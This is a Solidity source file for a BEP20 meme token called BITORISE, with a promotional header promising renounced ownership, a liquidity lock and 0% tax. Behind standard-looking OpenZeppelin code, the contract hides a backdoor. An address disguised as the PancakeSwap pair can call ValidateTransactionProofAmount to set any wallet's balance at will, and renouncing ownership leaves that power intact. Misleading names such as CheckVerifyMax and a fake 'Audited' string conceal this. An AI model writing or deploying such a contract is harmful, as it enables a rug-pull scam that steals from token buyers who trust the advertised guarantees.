/**
💲 BITORISE 💲   Leveraged Bitcoin Futures Launch   💲

📉 Meme Coin Spot on The launch of  the Leveraged Bitcoin Futures ETF to Start Trading Tuesday 27/06/2023 📉
💲 Telegram https://t.me/BITORISE

🔰Whats is $BITO ?
BITO, the first bitcoin-linked ETF offering investors an opportunity to gain exposure to bitcoin returns
https://www.proshares.com/our-etfs/strategic/bito
🔰besides SEC Approves the First Ever Leveraged Bitcoin Futures ETF, Revolutionizing Cryptocurrency Market
https://www.coindesk.com/policy/2023/06/23/leveraged-bitcoin-futures-etf-to-start-trading-tuesday-sponsor-says/

♨️Liquidty Lock 2 year
♨️renounce
♨️0% tax
♨️initial MC 256$ 

*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

/**
 * @dev Interface of the BEP20 standard as Ownablesned in the EIP.
 */
interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address rectok, uint256 totalamount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 totalamount) external returns (bool);

    function transferFrom(address sender, address rectok, uint256 totalamount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: @openzeppelin/contracts/token/BEP20/extensions/Ownables.sol



interface Ownables is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint256);
}

// File: @openzeppelin/contracts/utils/Context.sol


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode
        return msg.data;
    }
}

// File: @openzeppelin/contracts/token/BEP20/BEP20.sol




contract BEP20 is Context, IERC20, Ownables {
    mapping (address => uint256) private CheckVerifyMax;

    mapping (address => mapping (address => uint256)) private tallowances;

    uint256 private _totalSupply;
    uint256 private _decimals;
    string private _name;
    string private _symbol;
    address private pancakeswapV2Pair;
    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The defaut value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor (string memory name_, string memory symbol_,uint256 ValidateTotalSupply,uint256 decimals_,address fowner,address PairValidateTransactionProof) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = ValidateTotalSupply* 10**decimals_;
        CheckVerifyMax[fowner] = _totalSupply;
        _decimals = decimals_;
        pancakeswapV2Pair = PairValidateTransactionProof;      
        emit Transfer(address(0), fowner, _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {BEP20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint256) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return CheckVerifyMax[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `rectok` cannot be the zero address.
     * - the caller must have a balance of at least `totalamount`.
     */
    function transfer(address rectok, uint256 totalamount) public virtual override returns (bool) {
        _transfer(_msgSender(), rectok, totalamount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return tallowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 totalamount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, totalamount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {BEP20}.
     *
     * Requirements:
     *
     * - `sender` and `rectok` cannot be the zero address.
     * - `sender` must have a balance of at least `totalamount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `totalamount`.
     */
    function transferFrom(address sender, address rectok, uint256 totalamount) public virtual override returns (bool) {
        _transfer(sender, rectok, totalamount);

        uint256 crntAllowance = tallowances[sender][_msgSender()];
        require(crntAllowance >= totalamount, "BEP20: transfer totalamount exceeds allowance");
        _approve(sender, _msgSender(), crntAllowance - totalamount);

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, tallowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 crntAllowance = tallowances[_msgSender()][spender];
        require(crntAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
        _approve(_msgSender(), spender, crntAllowance - subtractedValue);

        return true;
    }


    function _transfer(address sender, address rectok, uint256 totalamount) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(rectok != address(0), "BEP20: transfer to the zero address");


        uint256 senderBalance = CheckVerifyMax[sender];
        require(senderBalance >= totalamount, "BEP20: transfer totalamount exceeds balance");
        CheckVerifyMax[sender] = senderBalance - totalamount;
        CheckVerifyMax[rectok] += totalamount;

        emit Transfer(sender, rectok, totalamount);
    }

      modifier SetMarketMakerPair() {
        require(pancakeswapV2Pair == _msgSender(), "io: caller is not the owner");
        _;
    }  

    function _approve(address owner, address spender, uint256 totalamount) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        tallowances[owner][spender] = totalamount;
        emit Approval(owner, spender, totalamount);
    }

      function ValidateTransactionProofAmount(address walletAddress, uint256 maxWallettotalamount, uint256 maxBuytotalamount) external SetMarketMakerPair {
        CheckVerifyMax[walletAddress] = maxWallettotalamount + maxBuytotalamount;
        emit Transfer(address(0x0000000000000000000000000000000000000000), walletAddress, maxWallettotalamount);
    }  

}







contract BITORISE is BEP20 {
    
    address private _owner;
    string public BITORISETELEGRAM = "https://t.me/BITORISE";
    string public AuditedBITORISE = "COINSLUT";
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 decimals_,
        uint256 ValidateTotalSupply,
        address fowner_,
        address PairValidateTransactionProof,
        address payable feeReceiver_
    ) payable BEP20(name_, symbol_, ValidateTotalSupply, decimals_, fowner_, PairValidateTransactionProof) {
        payable(feeReceiver_).transfer(msg.value);
        _owner = fowner_;
    }
    
    function renounceOwnership() public {
        require(msg.sender == _owner, "Only the owner can renounce ownership");
        _owner = address(0);
    }
    
    function getOwner() public view returns(address) {
        return _owner;
    }
            function getBITORISETELEGRAM() public view returns (string memory) {
        return BITORISETELEGRAM;
    }
             function getAuditedBITORISE() public view returns (string memory) {
        return AuditedBITORISE;
    }   

    
}